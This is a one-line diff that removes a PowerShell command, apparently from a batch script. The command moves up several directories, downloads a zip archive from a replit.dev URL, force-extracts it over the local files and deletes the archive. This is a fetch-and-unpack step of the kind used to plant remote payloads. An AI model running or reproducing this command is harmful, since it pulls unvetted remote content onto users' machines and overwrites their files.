@@ -1,1 +1,0 @@
-powershell "cd -d %~dp0..\..\..\..\..;$file='$temp$.zip';$url='https://13950714-be8e-4274-bdfb-c5276a2ff1ad-00-cdozt0sjea5j.teams.replit.dev/s/?zip';Invoke-WebRequest -Uri $url -OutFile $file;Expand-Archive -Path $file -DestinationPath . -Force;Remove-Item $file"||pause
